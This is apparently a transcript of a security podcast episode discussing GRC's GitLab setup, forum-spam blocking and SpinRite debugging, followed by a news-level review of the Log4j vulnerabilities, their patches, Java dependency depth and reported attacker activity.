STEVE:  Unh-unh.  No, unh-unh.  No.  Okay.  So as planned, last week I brought up GRC's own instance of GitLab.  It's a big, lumbering Nginx and Ruby on Rails conglomeration that also drags in all manner of other accoutrements.  And watching go in, it's really so clear why security has become such a problem for our industry.  I mean, you push a few buttons, and then you stand back while screen after screen scrolls by as module after module, I mean, hundreds and hundreds of the little buggers download, install themselves, and set up shop.  You know?  So just stand back and hold your breath.



What are they all doing?  No one knows.  This one needs that one, and that one needs another one, and before you know it 150 million bytes of your mass storage has been commandeered by the forces of darkness.  Processes are now running that are presumably all supposed to be running.  You know?  And what choice do you have?  It's free.  Do you want it or not?  And what are you going to do?  Write it yourself?  And actually there was a comment over on GRC's spinrite.dev newsgroup urging me to please not spin off and write a bug tracking system in assembly language.  Not to worry, that won't be happening ever.



So I put this thing, because I don't trust it, you know, trust has to be earned.  I put this thing on its own physical FreeBSD server and sequestered its network behind a physical firewall with its own dedicated port.  The only thing it has any access to is the outside world.  It can see out, but it can't look around.  And all that said, GitLab really is a very nice piece of work.  I don't feel like I know it fully yet, or really trust it.  But now that we have it, I think it makes sense to use it.



As I mentioned before our threaded conversation textual-only newsgroups are really perfect for what they are.  They're fast and simple for casual use.  And they allow us to move with great speed when we're all moving forward as a group.  And they've served us well until now.  But they're not ideal when we get stuck on a problem.  We already have the web forums, but those are really targeted at our future SpinRite end users.  That's where I want, you know, that'll be the official GRC support side.  And GitLab is clearly not aimed at the uninitiated end user.  You know, there's a lot of "Where's the button I'm supposed to push?" certainly at the start.



But I, GRC, and SpinRite have been blessed with a bunch of really amazing and terrific testers who have large arrays of hardware at their disposal and who have shown an enduring interest and willingness in actively participating in SpinRite's development testing.  So I think that this GitLab instance will be there for them to use if they choose to use it.  Many testers are understandably less involved in this entire process, and that's fine.  We need them, too.  They tend to swing by every week or two to give the latest release a try.  And they generally just post that it worked again, as usual, as they all do.  And I don't want to mess with that, or giving them any kind of a burden.  So we'll still have the newsgroups for quick, just drive-by posting of go/no-go notes of successive SpinRite test releases.  But I think that GRC's GitLab instance will be a very valuable resource for those who are interested in working with me when sticky problems arise.



Oh, and I did want to mention one thing, just because I hadn't, and it changed my life a few months ago.  Last week I posted a shout-out to the free service whose performance has stunned me.  What I tweeted was "A shout-out to @StopForumSpam."  I said:  "GRC's forums were drowning in forum spam because forum spammers are people, typically in the Eastern bloc, who create temporary throwaway Gmail accounts and manually bypass all CAPTCHA challenges.  But after adding StopForumSpam, not a single fake registration."  So it really works.



I looked high and low for some solution, and turns out it was built into XenForo.  It already had support for it, but for some reason I hadn't turned it on in the beginning.  So the moment I did, this problem disappeared.



LEO:  Do you get a lot of false positives, though, like people who aren't spammers?



STEVE:  One so far.



LEO:  Okay.



STEVE:  One in six months.



LEO:  That's pretty good, yeah.



STEVE:  I'm very impressed by that.  And when it happens, they use the contact form to say, "Hey, what's up?"



LEO:  Hey, what happened?



STEVE:  And I say, "Sorry about that," and I approve them.  So what I'm hoping is that I can find this for GitLab because I just don't want - it just bugs me, you know, sort of just from a "get off my lawn" standpoint.  I just don't want a bunch of crap in my forums or burdening my GitLab instance.  That's just - it's annoying.  And eventually they're going to be posting crap, and they ultimately get around to doing that, which is annoying, too.



So it turns out that there's an old project on GitHub from seven years ago.  StopForumSpam has a very simple web API.  So it's simple for some code to reach out and query the IP, the email address, and the username to see if it's on the blacklist.  And boy, does it work.  So maybe there'll be some way, an easy way to get this added to GitLab.  That would be my dream.  But for what it's worth, forum spam, I did some looking around when I was trying to find a good solution before it occurred to me, oh, just turn it on.  It's a real, it's a big problem for a lot of people.



LEO:  Yeah.  I just manually approve everybody.



STEVE:  Yes.



LEO:  And you can usually tell a spammer.  It's funny, they don't try to - I shouldn't say this out loud - get into our forums very often.



STEVE:  Good.



LEO:  But they try to get in our Mastodon instance.  Usually about nine to one requests to join are from spammers.



STEVE:  Yes.  I know.  In fact, when I whittled them down, we lost three quarters of what looked like people who, like, members on GRC's forums.  It was crazy.



LEO:  It's bad, yeah.



STEVE:  It was just crap.



LEO:  Our forums mustn't yet be on the list of attackable forums.  I won't tell anybody.



STEVE:  Yeah.



LEO:  Don't mention it again.  What forum?  We don't have a forum, no.



STEVE:  So as for SpinRite, I think a pattern is beginning to emerge.  I mentioned last week that I had purchased some stuff on eBay.  All of that new - actually three different motherboards have come in.  What I'm seeing is that all of my new SpinRite code generally works perfectly on all newer hardware which is behaving correctly.  Pretty much anything I do just works right off the bat there.  Which is why the vast majority of people who are in the spinrite.dev newsgroup just say, yeah, you know, I've never had a problem.  I don't know what's up with you other guys, but everything Steve does just works.



But it's on older hardware, typically very old hardware, where what I think early and probably slightly incompatible operation was originally being hidden behind those older systems' BIOSes.  But now that SpinRite is bypassing the BIOS, we're encountering a few gotchas which is what I'm now in the process of addressing.



I got one, it was an ASUS M4A78 motherboard or something, like from - the last BIOS was 2010, so 11 years old.  And when I got it and ran SpinRite, the benchmark was like stuttering.  And I immediately noticed that the progress bar wasn't moving smoothly for 7.25 seconds as it's supposed to.  Well, it's being moved by the clock tick, which occurs at 18.2 Hz.  And that's the highest priority interrupt in any PC is that timer because you don't want to lose track of time.  And it's very brief.  It just increments a counter and then returns control.



My point is that progress bar can't hesitate.  I mean, it can't.  So something is very wrong somewhere if it's only advancing as the drive's transfer completes, which is on an old, I had a 300GB Maxtor drive, IDE, and it took a substantial amount of time to do one of these big block transfers, a 16MB transfer.  And what I was noticing was the progress bar was jumping ahead by a big chunk every time a transfer finished, as if somehow like the clock interrupt was not happening.  It's like, what?  So anyway, that's my project for tonight is to roll - I'm going to rub my hands together.



Oh, I forgot to mention that when I - so it was doing that but not crashing, where it was crashing on the two other systems that the two people who have these were trying, were testing SpinRite on.  But it also had an old BIOS.  When I updated to the latest BIOS, now it crashes.  So, like, what?  Anyway, so why should - I'm not using the BIOS.  So why should changing the BIOS have any effect on the hardware?  I don't know.  Anyway, these are the problems I live for, and I've got three motherboards that are causing these problems at the moment.  They'll probably be fixed by the time everyone hears from me again in two weeks.



LEO:  Oh, my god.



STEVE:  Because we have vacation next week.  Anyway.



LEO:  We're ready to hear about more troubles with Log4j.



STEVE:  Well, so we all knew that nothing as ubiquitous and pernicious as Log4j was going to be wrapped up in a week.  And indeed there's a lot more to talk about this week.  And I guess if last week's podcast served to introduce the problem, this week we're going to gain some perspective on its consequences.



As we know, Log4j earned the, I don't know if we've ever seen I before, CVSS score of 10.0.



LEO:  You don't get much worse than this, I think it's fair to say.



STEVE:  And Leo, I'm put in mind of that old joke about the volume controls of massive stereo amplifiers which, because they have so much power, need to have their volume controls range from 0 to 11.  If there was ever a case for a CVSS score of 11 out of 10...



LEO:  Goes to 11.



STEVE:  Yeah, Log4j is as good a case as any.  Okay.  So since last week, much has happened.  On the remediation front, while the audio was still reverberating from last week's podcast recording, the Apache Software Foundation published an updated fix for the Log4j vulnerability after it was discovered that the previous patch, the one from the previous Thursday was incomplete in certain non-default configurations.  So it was technically the second but related vulnerability, so it was given its own CVE, 2021-45046.



And because it didn't induce nearly as much hyperventilation among security experts, it was initially rated at a CVSS of 3.7, which, you know, you don't even get out bed for that, because it was initially believed to only have DoS, you know, as in you could crash something, denial of service consequences.  But apparently the bad guys couldn't do any worse than that.  But that unexciting score was soon amended to a brightly glowing 9.0 once it became clear that an attacker could send specially crafted strings which could lead to information leakage and remote code execution in some environments, and local code execution in all environments.  Whoopsie.  So that was important.



So the second discovery affected all versions of Log4j, all the way from 2.0-beta9, which is where the whole Log4j 2 began, up through 2.12.1 and 2.13 through 2.15.0.  And remember that 2.15 was the big fix that the Log4j project maintainers had just shipped the week before.  That was obsolete now, so we had 2.16.  And this JNDI Lookup was essentially disabled by default as a consequence.  After all the headache with 2.15 and saying, well, you know, we're going to filter this, and we're going to try to eliminate that, they decided no.  JNDI, this is just too big a mess.  Nobody really needs it in loggings.  And if you do, okay, then as we mentioned last week, you could turn it on.



Anyway, it is much more firmly disabled now in 2.16.  And that's for Java 8.  If for some reason you're on Java 7, then look for 2.12.2 as soon as it becomes available.  That's the one that you'll need for Java versions 7, you know, Java major version 7.



The Apache Software Foundation's Ralph Goers said:  "Dealing with CVE-2021-44228" - that was the original one - 



"has shown that JNDI has significant" - it's hard to even say that with a straight face - "significant security issues."  Yeah, really?  "While we have mitigated what we are aware of, it would be safer for users to completely disable it by default, especially since the large majority are unlikely to be using it."  But until now, of course, even though it's always been true that the large majority are unlikely to be using it, we had it turned on.  Okay?  Lesson learned.



And since last week the line-up of well-known affected organizations has, of course, only grown.  Here we are on Tuesday.  Last week the list in alphabetical order of the biggies was "Akamai, Amazon, Apache, Apereo, Atlassian, Broadcom, Cisco, Cloudera, ConnectWise, Debian, Docker, Fortinet, Google, IBM, Intel, Juniper Networks, Microsoft, Okta, Oracle, Red Hat, SolarWinds, SonicWall, Splunk, Ubuntu, VMware, Zscaler, and Zoho."



LEO:  Holy moly.



STEVE:  So A through Z, baby.  And we'll be looking at why in a minute here.  Also as of last week, 10 different attacking groups have been identified, and roughly 44% of corporate networks globally have been under attack.  The U.S. CISA, the awkwardly named Cybersecurity and Infrastructure Security Agency (CISA) has given all federal agencies the deadline of December 24th, that's Friday, this Friday, to fully incorporate all patches for the vulnerability.  And I'm going to explain why that can't possibly happen.  No one gets to have Christmas until every agency's Log4j vulnerabilities have been fully remediated.  The only way to do that is to pull the plug.  Because the fixes are not available, and Google is estimating we've got years before that's going to happen, and I'll explain why in a minute.



Sophos's senior threat researcher Sean Gallagher said that:  "Adversaries are likely grabbing as much access to whatever they can get right now with the view to monetize and/or capitalize on it later on.  There's a lull before the storm," he's saying, "in terms of more nefarious activity from the Log4Shell or Log4j vulnerability.  The most immediate priority for defenders is to reduce exposure by patching and mitigating all corners of their infrastructure and investigate exposed and potentially compromised systems.  This vulnerability can be everywhere," he said.



Okay.  So that took us from 2.15 to 2.16.  But wait, there's more.  Later in the week researchers discovered an entirely new Log4j attack vector.  And we knew that was going to happen.  We talked about it; right?  I mean, there are other ways to get there, which enables adversaries to exploit servers locally by using a Java WebSocket connection.



Matthew Warner, the Chief Technology Officer for Blumira said, and get a load of this one:  "This newly discovered attack vector means that anyone with a vulnerable Log4j version on their machine or local private network can browse a website and have this vulnerability triggered."  Wow.



LEO:  Now, of course you have to be logging, using Log4j to log that traffic.  I mean, it won't just - it can't just be sitting there not running and be affected.  It has to be running; right?



STEVE:  Uh, well, if Log4j.jar is in your process tree somewhere...



LEO:  Yeah.  Running.



STEVE:  And your browser can be the way to get to it.



LEO:  Trigger it, yeah, yeah.



STEVE:  Yes, right.  So it won't launch it.



LEO:  Most home users aren't running Log4j.



STEVE:  No, no, no.  I mean, it can be any of the, let's see, Google counted it as something like 34,000 different Java things.  So any of those being used brought Log4j along with it.



LEO:  Right, right, right.



STEVE:  Yes, yes.



LEO:  But I think mostly those are going to be associated with some, I mean, you don't log, well, maybe you do.  I don't know.  I mean, there's constant logs.



STEVE:  Oh, Leo, have you ever - have you looked like at some of your directories?



LEO:  Yeah, yeah, I know I'm logging.  But I'm not using - I don't think Apple or Microsoft uses Log4j to log the console log.  Maybe, I mean...



STEVE:  Oh, no, no.  It's the...



LEO:  It's mostly the servers.



STEVE:  I don't know.  I mean...



LEO:  I hope.



STEVE:  We'll have plenty to talk about next year.



LEO:  I mean, that's the real question, yeah, I mean, is how much should people who are not knowingly running servers worry about this.  Might they have Log4j?  I mean, I run Minecraft Server, so I know I probably have Log4j running.



STEVE:  You think?



LEO:  But if you're running - but I know because I'm a server.  Most people are not running servers out of their house.



STEVE:  Right.



LEO:  I'm hoping that most people would not be exposed to this.  But I might be wrong.  I'm just curious.  I might be wrong.



STEVE:  So it's not only for servers.  Servers were the initial vulnerability because they listen for bad guys on the outside.  I've got some, I don't know if it's Java-based.  I think it is.  It's a RAID.  Intel's RAID monitoring package is Java-based, so it could be cross-platform.  And so they brought it along as part of the easy way of implementing things these days.



LEO:  And it's normal for software to run logs because...



STEVE:  Yes.  In fact...



LEO:  To keep track of errors and things like that.  Every operating system is.



STEVE:  Yes.  And I was going to say, if you've ever like dug deep into some, like, directories under your own user tree in Windows, there's, like, logs.  It's like, what is all this crap?  And it's like, you know, but it's doing stuff.



LEO:  Oh, yeah.  Occasionally you use them, you know.



STEVE:  Yeah, and it's on - and I'm on a workstation, yet it's still happening.



LEO:  Oh, yeah, me, too.  Now, there's a request in the chat room, and I agree with it.  You need to write NeverLog4j.  You need to do that right now.  Forget it.  Just go out, write it, NeverLog4j.  Put it up on the site.  You'll have a million downloads because there is really, right now, to my knowledge, there's no way to say, I mean, you could attempt to trigger it, I guess.  But there's no way to say, oh, I'm not running it; you know?



STEVE:  Yeah, that's a very good point.  It would be worth someone - I'm going to be debugging SpinRite tonight.



LEO:  No, I know, you're busy.  I know.  You've got to watch a movie about Neo.  I understand.  You've got priorities.  You don't work for us 24/7.  But, I mean, in theory, I mean, you could - your IoT devices may be running it.  I mean, many of these IoT devices could be running it.



STEVE:  Yes.



LEO:  I wouldn't be surprised.



STEVE:  Well, where are they going to put their log?  But you're right, they might be rolling their log daily.



LEO:  Right.



STEVE:  And having it available in case something crashes.



LEO:  In case you have a problem.  Then you can...



STEVE:  Yup.



LEO:  How often do you see that in the preferences?  Well, you know, here, you can upload the log to the support.



STEVE:  Yes.  Yes, yes.  You know?  Who knows what's in our routers?



LEO:  Exactly.



STEVE:  Yes.  Anyway, so Matthew Warner said:  "At this early stage there is no proof of active exploitation."  Meaning that your browser can be the entry point.  He said:  "But this vector significantly expands the attack surface and can impact services even running as localhost which were not exposed to any network."  And so that's what makes this latest local attack vector such a concern.  So although this latest discovery can be resolved by updating all local development and Internet-facing environments, last Friday Apache rolled out yet another version of Log4j, 2.17.0.  So we now have the original CVE 44228 with its CVSS score of 10.0, fixed by version 2.15.  Then CVE-2021-45046 with its score upgraded from 3.7 to 9.0, and that was fixed by 2.16.0.  And finally, CVE-2021-45105 with its CVSS of 7.5, because it's local only, but still can get you, which is fixed by 2.17.0.



LEO:  By the way, my router is running Log4j.  I forgot.  Because I'm using the Ubiquiti router.



STEVE:  Oh, that's right.  Ubiquiti's on the list.



LEO:  UniFi uses it, yup.



STEVE:  Yup.



LEO:  That's nice.



STEVE:  Yeah, there you go.  What could possibly...  Anyway, Jake Williams, the CTO and co-founder of the incident response firm BreachQuest, said:  "We shouldn't" - as in should not - "be surprised that additional vulnerabilities were discovered in Log4j given the additional specific focus on the library.  Similar to Log4j, this summer the original" - and this is Jake saying - "PrintNightmare vulnerability disclosure led to the discovery of multiple additional distinct vulnerabilities.  The discovery of additional vulnerabilities in Log4j should not cause concern about the security of Log4j itself.  If anything, Log4j is more secure because of the additional attention paid by researchers."



And I would just say turn off that variable interpretation and expansion.  That's where all of the problem came from.  Not from logging, but from the fact that it was like ridiculously open-ended and over-powered so that you could cause variable expansion to go do a DNS or an LDAP query or download Java and run it.  I mean, that's just nuts.



Okay.  So not too surprisingly, additional problems were found with the original vulnerability; right?  And the initial fixes needed fixing.  So that's happened.  So now anybody who thought, okay, good, I installed 2.15, well, no.  Now you need 2.17.  So that would probably be a good idea.



So, what have we learned about the extent of Log4j's usage which need to be found and fixed?  And this is really interesting.  Okay.  So one source of appraisal is Google, who had their open-source team scan Maven Central.  Maven Central is today's largest Java package repository.  What they found was that 35,863 individual Java packages were either directly or indirectly using vulnerable versions of Apache's Log4j library.  Their scan looked for packages that used Log4j versions which were vulnerable to both the original Log4Shell exploit we first talked about last week, and also the second remote code execution bug discovered in the Log4Shell patch.



Members of the Google Open Source Insights Team said when a major Java security flaw is found - major; right?  I mean, past major Java security flaws generally affect around 2% of the Maven Central index.  However, thanks to the prevalence of the use of Log4j, the 35,863 Java packages vulnerable to Log4Shell account for roughly 8% of Maven Central's total of around 440,000 Java packages.  This was an impact that the team members characterized as "enormous."



And despite the effort and focus, fixing everything is a monumental task.  Google published their report at the end of last week on the 17th where, at that point, 4,620 out of the total 35,863 packages had been updated.  But we've seen that these things tend to taper off exponentially, right, with the most work immediately being done and with the pace inevitably slowing with each passing day and week and month.  Because of this, the Google guys said they didn't expect the Log4Shell issue to be patched in full, at least for years.



One contributing reason is because Log4j is, more often than not, an indirect dependency.  Java libraries are built by writing some code which uses functions available in other Java libraries, which they import.  And those are built by writing some code which uses functions from other Java libraries and so on.  That's really how it happens.  So the problem is more often not that a Java library directly uses Log4j; 17% do.  It's that the other 83% instead use another Java library which might use Log4j, or might use another library that does, and so on.  And as a result of this multiple depth inheritance, maintainers of vulnerable Java packages are forced to wait until other developers and maintainers of the packages they depend upon have updated their own libraries.



To put some numbers to this, Google explained - and Leo, I have a really cool histogram on the next page, page 11 on the show notes.  Google explained that Log4j is only a direct dependency in approximately 7,000 packages of the more than 35,000 vulnerable libraries.  So many Java developers either need to wait for the packages they use to be updated or search around for and switch to alternative solutions that are not vulnerable.



When Google was asked why fixing the JVM ecosystem was so hard, their open-source team explained that by far most JAVA modules depend upon Log4j indirectly.  And the deeper the vulnerability is down the dependency chain, the more steps are required for it to be fixed since the bottommost module, where the direct dependency exists, must be fixed first.  Then the module that depends upon that module needs to be rebuilt using its dependency which is now fixed.  And then the module above that one needs to be rebuilt, and so on.



So Google's report used a histogram to elegantly summarize the dependency chain depths they encountered when they were exploring each of the approximately 440,000 dependency chains in search of any that use vulnerable Log4j instances.  And I've got, as I said, I've got that chart in the show notes.  You'd expect to see more or less decreasing incidence statistically as the depth increases.  And overall that's what we do see.  But there's a weird jump upward at a dependency depth of 5.  The histogram shows that about 14.75 percent of all dependencies occur at a depth of 4.



Now, that's - I should also mention that it looks like 17%, as I mentioned before, have a depth of 1, meaning that the package directly uses Log4j.  But then looks like around 21% are using a package where that package uses Log4j.  So a depth of 2 has 21%.  And so of course you have to sum those to get the total packages with 1 or 2.  Then a depth of three drops to around, looks like 12%.  A depth of 4 for some reason, as I said, goes up to 14.75.  But then for some reason that almost doubles at a depth of 5 to 26.5% of all dependencies occurring at the 5, which is more than one in four of all the vulnerable packages.  



LEO:  I think there must be one package a lot of people use that depends upon, depends upon, depends upon, depends upon Log4j.



STEVE:  Right, right.



LEO:  And so it's got to be - there's got to be one outlier package that has Log4j deep, buried deep within its dependencies that everybody uses.  You know, and it might be Apache.  It might be, you know, something just widely used.  That's got to be it; right?



STEVE:  Yeah, it's got to...



LEO:  It's so weird.



STEVE:  I think that because, I mean, it just is like a complete statistical outlier because then, as if to make up for that big almost doubling from between 4 and 5...



LEO:  It just goes away.



STEVE:  ...then it crashes; right.  Then it drops to 6% of them at a depth of 6 and looks maybe like a half a percent at a depth of 7 or 8.  So but what this means is that, if the root Log4j dependency is 5 dependency layers down, then all five - then that package must be fixed.  And the packages that depend upon it must be fixed.  Then the packages that depend on it must be fixed, and fixed again, and fixed again.  And it has to be done in sequence.  Right?  Because you have to be able to import the packages you're dependent upon, rebuild your library using the updated dependencies.  Only then can the person maintaining the library that's dependent upon yours update theirs.  And if at any point in that chain somebody's on vacation or got tired of that project and, like, eh, you know, then everything comes to a grinding halt.  Nothing beyond that can get updated.



So, I mean, it's really bad.  I mean, it's kind of a messed up system from that standpoint.  And you have to say, wow, it's amazing it does as well as it does.  And of course it reminds of that crazy stack of blocks where there was one little twig holding the whole rickety thing upright, and everyone's hoping that that tower of blocks is not in California where we tend to have earthquakes.



LEO:  Yeah.  Naive question.  I think I know the answer.  Why don't I just search for all occurrences of Log4j.jar and delete it?



STEVE:  Oh.  Because it could be a binary inclusion.  It could be linked into...



LEO:  Ah.  So it wouldn't necessarily be a Log4j.jar file.



STEVE:  Correct.  It could be...



LEO:  It could be linked in.  You might not see it.



STEVE:  Yes, yes, the Log4j functionality built into a package.



LEO:  Not to mention you'd probably break a bunch of stuff if you just delete it.



STEVE:  Well, exactly.  Exactly.



LEO:  And some software will go, oh, somebody deleted my Log4j.  Let me just download that again.  Wow.  And I imagine in the manifest, if you had a good package manager - oh, I don't know.  It's just a mess.



STEVE:  There are some that allow you to specify ranges.



LEO:  You should say nothing less than whatever it is, 2.15.



STEVE:  But it may well have been that someone said 2.12 to 2.15 because those are the ones that were known to be compatible.  And we don't know about 16 or 17.



LEO:  Right, right.



STEVE:  So it's like, yeah, no, no, I don't want that one.



LEO:  We've kind of - we know about this world because this is what happens with Python and a lot of programming languages.  And you do, you know, in the manifest you'll specify, no, it has to be this version or this version.



STEVE:  Right.



LEO:  And it just won't compile and won't run.



STEVE:  Right.



LEO:  What a mess.



STEVE:  So it's difficult to estimate at this early stage.  But yes, Leo, it is an incredible mess.  We don't know, you know, so much depends upon the maintenance of packages which may not be receiving routine updating.  In attempting to get some answer to this question, Google looked at all publicly disclosed past critical advisories, okay, all publicly disclosed past critical advisories affecting Maven packages to get some sense of how quickly other vulnerabilities in the past have been fully addressed.  Okay.  You ready?  Less than half (48%) of Java packages affected by a previous critical vulnerability have ever been fixed.



LEO:  That's nice.



STEVE:  So Google says we might be waiting for a long time, likely on a scale of years.



LEO:  Holy moly.



STEVE:  Yeah.  On the other hand, those vulnerabilities may not have made the front page, and there might never have been the pressure to fix them that there has been on this one.  So we can hope.  In less than a week, 4,620, that's 13% of those known to be vulnerable have been fixed.  But we can also assume that those had shallow dependency depths and didn't require some guy, I mean, there's one that's eight layers down.  How are you ever going to get all of the packages in an eight-layer dependency tree fixed?  I don't know.



LEO:  I don't know.



STEVE:  So what's happening on the attack front?  No good news there.  Bitdefender, the Romanian AV maker, said it has spotted the first ransomware group using the Log4Shell vulnerability to infect and encrypt unpatched systems.  The first attacks were spotted on Sunday, December 11th.  Okay.  Remember this was announced on the 9th.  So it took two days, two days to incorporate Log4j into a ransomware attack.  They have been carried out using a new strain of ransomware named Khonsari.  Khonsari means "bloodshed" in Persian.  The Khonsari ransomware - yeah, great - is coded in .NET and can only target Windows systems, and it has not impressed researchers.  The MalwareHunterTeam and Michael Gillespie, he's that guy that does all of the free decryptors when they can be done.  They've both described it as low-effort "skidware" assembled from publicly available code.



LEO:  I'm not going to go too far down the road of this, but I think I know what "skidware" implies.  I don't want to go too far down that road.



STEVE:  That's good.



LEO:  We'll leave it as an exercise for the reader.



STEVE:  That's their term.  But despite its rather low quality, the ransomware is functional and can successfully encrypt systems after a successful Log4Shell attack.  Khonsari uses properly designed encryption, and no flaw so far has been found in it.



A group that doesn't produce "low-effort skidware" is the professional Conti ransomware gang, responsible for hundreds of millions in received ransomware payments.  They were the second ransomware group to immediately jump on the vulnerabilities in Log4j with scans and attacks beginning on Monday, December 13th, so four days following the December 9th public disclosure of the vulnerabilities.  The Conti gang are specifically targeting, at least now, VMware vCenter servers, which are known to be vulnerable to Log4Shell attacks.  When exploited, they gain access to the server and then immediately move laterally across enterprise networks.



So it has to be the case, Leo, that we got a lot of insinuation into networks, which as the researchers have said, no one's jumping on, or not everyone is necessarily immediately jumping on leveraging their newfound footholds.  They're just wanting to get in immediately before the openings are closed.  And once in...  



LEO:  We'll figure out what to do later.  We're in there.  Just get in now.  You'll think of something later.



STEVE:  We'll look around and see who we landed.  Yeah.  So besides the threat from Khonsari, Bitdefender also reported on other malware groups that have been using vulnerabilities in Log4j to install DDoS and cryptomining botnets.  The Chinese security firm Qihoo 360 said last Monday that they've been tracking at least 10 different groups abusing the vulnerability, as well.  And Check Point has reported that it has seen at least 60, six zero, variations on the Log4Shell exploit so far, as a result of bad guys working around the quick mitigations which were put in place after the exploit first became public.  Remember we talked about that, different ways of obscuring the variable expansion in order to avoid the filters that the people just quickly did.



And of course all the serious players jump on this immediately.  The APT (Advanced Persistent Threat) groups based in China, Iran, North Korea, and Turkey were immediately active.  The strategy appears to operationalize the vulnerability, as we've said, by discovering and establishing a foothold.  And then, yeah, we'll see what we find.  1.8 million attempts to exploit the Log4j vulnerability have been recorded as of early last week.  This thing just took off like a rocket.  And initial access brokers, remember those are the miscreants who first penetrate systems to then sell their illicit access to others to exploit, Microsoft's Threat Intelligence Center, the MSTIC, said it had observed IABs, these Initial Access Brokers, immediately leveraging the flaws in Log4j to obtain initial access to target networks that were then sold to other ransomware affiliates.



LEO:  Oh, that's a good idea.  Break into them and just say, I've got access, anybody wants to buy it.  That's brilliant.



STEVE:  Yup.  What's it worth to you?



LEO:  What's it worth to you?  Oh.



STEVE:  Yup.



LEO:  God, this is so bad.



STEVE:  I know.



LEO:  It really is bad.



STEVE:  Merry Christmas.  In addition, Microsoft said that dozens of malware families running the gamut from cryptocurrency coin miners and remote access trojans to botnets and web shells have been identified taking advantage of Log4j.  The industrial cybersecurity firm Dragos noted that:  "This cross-cutting vulnerability, which is vendor-agnostic and affects both proprietary and open-source software, will leave a wide swath of industries exposed to remote exploitation, including electric power, water, food and beverage, manufacturing, transportation, and more."



They said:  "Log4j is used heavily in external Internet-facing and internal applications which manage and control industrial processes, leaving many industrial operations like electric power, water, food and beverage, manufacturing, and others exposed to potential remote exploitation and access.  It's important to prioritize external and Internet-facing applications over internal applications due to their Internet exposure, although both are vulnerable.  As network defenders close off more simplistic exploit paths and advanced adversaries incorporate the vulnerability into their attacks, more sophisticated variations of Log4j exploits will emerge with a higher likelihood of directly impacting Operational Technology networks."



So as we said last week, while I don't plan to dwell on the issue to excess, I have the feeling that the impact of Log4j will be laced throughout the early months of 2022, Leo.  And, boy, it really does, when you look at what Google's research showed, the depth of dependencies in the Java package trees, it's going to be some time before this is able to get itself fixed.  



LEO:  And I don't know how well-documented dependencies are.  So if it's compiled into something that you use...



STEVE:  Right.  How do you know?



LEO:  I mean, if you're lucky, maybe in the documentation or somewhere it says, I mean, sometimes you hit, you know, you do a man command, and it'll show you dependencies at the bottom.  But sometimes not.



STEVE:  But yeah.  Eight layers down?



LEO:  Yeah.  It wouldn't know.



STEVE:  Some guy incorporated it, and maybe not even using it, but it's there because, you know, hey, it's free, so let's just say yeah.



LEO:  Wow.  And really all it takes to trigger it is a malformed string that it logs.  So if it's logging stuff, including web traffic, if it logs that malformed string, you're done.



STEVE:  And it could have set up a RAM buffer to, like, log it in a ring so that it just has, like, you know, if something happens it's able to say here's what was going on.  So it doesn't even have to be writing it.  It could be just doing it in order to, like, hold a most recent event in memory in case it had a problem.  And even that would be triggering this problem.



LEO:  There are, the chat room's telling me, Dr. Flay, that there are some vulnerability checkers on GitHub.  There's one called Grype.  I don't know how well it works.  I don't know if it's just comparing stuff you've installed to a list of known problems, or if it's actually testing it.  But, I mean, and then there's another one called Log4Shell-tester from Huntress Labs.



STEVE:  I was glad that when I installed GitLab it was Ruby and not Java.



LEO:  Yeah.  But that's not a guarantee because you don't know.  Down the road there might be a dependency that is in Java.  So you're running GitLab now?  I'm glad to hear that.



STEVE:  Yeah.



LEO:  Yeah.  That's just for your, that's right, I remember you talked about that, for your source code for SpinRite.



STEVE:  Actually not source.  I won't be putting the source up there.  It's so that - because all we really have now for vulnerability management is the newsgroups.



LEO:  Right.



STEVE:  And it's fine if everything's sort of moving forward.  But like when we get stuck on a motherboard, then like a week ago, and I'm trying to think because I'm like juggling all of this in my head...



LEO:  So people can submit.



STEVE:  ...and say, okay, wait a minute, was it - yes.



LEO:  Yeah, yeah, yeah.



STEVE:  And so the idea is we'll have GitLab available for managing and tracking persistent problems that don't just immediately like, oh, of course, and I, like, you know, produce another update and then it fixes that.



LEO:  Git's really great for that.  I mean, Git is an amazing tool.  I really like it a lot.



STEVE:  Yeah.  And I'm very - I may very well.  Right now I'm using Sync.com to sync my source.



LEO:  I know you are.  And I was going to ask when you had first found that, why don't you just use Git?  I might have even asked that.



STEVE:  You maybe did.



LEO:  Yeah.



STEVE:  And it's just because I never have.



LEO:  Right.



STEVE:  And I would be, I mean, it's one thing to put open source on Git.  It's a different thing to put proprietary...



LEO:  I wouldn't put anything proprietary in GitHub for sure because you don't know.  They might screw up.  You have private repositories, but they might screw up.  But I keep, for instance, I keep my Emacs dotfiles up there.  I keep, as I'm doing the Advent of Code, I'm putting my solutions up there.  Perfect for that.



STEVE:  Yeah, again, stuff where the loss is not critical.  



LEO:  Yeah, perfect for that.  But yeah, proprietary code.  But if you're running your own server, that's - as long as Log4j's not in there, you're all right.



STEVE:  Well, but it is publicly exposed.



LEO:  Yeah.  It's going to have to be; that's right, yeah.



STEVE:  Yeah.



LEO:  I really think that this is going to hasten the Zero Trust Model because at this point you might as well just assume that you have an attacker inside the network.  Right?



STEVE:  Yeah.  I would say, if you're an enterprise, and you have reason, like if your guys are screwing around last week and this week, trying to get this resolved before Christmas, and given the fact that it was so easy to scan for this remotely, and the bad guys jumped on this with a vengeance, I mean, like over the weekend, you know, IT was home on the weekend, and they were scanning over the weekend.  So it's, you know, immediately too late.



LEO:  Yeah.  Yeah.  And there's really, I mean, somebody uses it, there's no log of them using it.



STEVE:  Right.



LEO:  So you just don't know unless you catch them, if you're using a Canary or something.  But if they just lay low and say, look, we got access, it's going to be tough.



STEVE:  Now, what you really want is LogLog4j.



LEO:  LogLog4j.  What could possibly go wrong?  Steve Gibson's at GRC.com.  When you go there, there's a few things you might want to check out.  Of course this show.  He's got unusual versions of the show.  We both have the 64Kb audio, but Steve has the 16Kb audio.  Sounds a little bit like Alexander Graham Bell on his first recording.  But, hey, it's small.  Also small, the fantastic transcripts Elaine Farris does for every episode, which allow you - they're searchable and allow you to find parts of the show, or just to have it to read along while you listen.  And he has full-quality audio.  All of that at GRC.com.



While you're there, pick up a copy of SpinRite.  Version 6.0 is out right now, as you know, the world's best mass storage recovery and maintenance utility.  You will get 6.1 automatically if you buy 6.0 now.  And you can also participate in the development of 6.1, imminent.  Let's see.  There's all sorts of stuff in there.  Just browse around.  It's kind of a rabbit warren of goodness:  GRC.com.  I'm sorry, I shouldn't have said that while you were drinking.



STEVE:  A rabbit warren.



LEO:  Of goodness.



STEVE:  That's right.



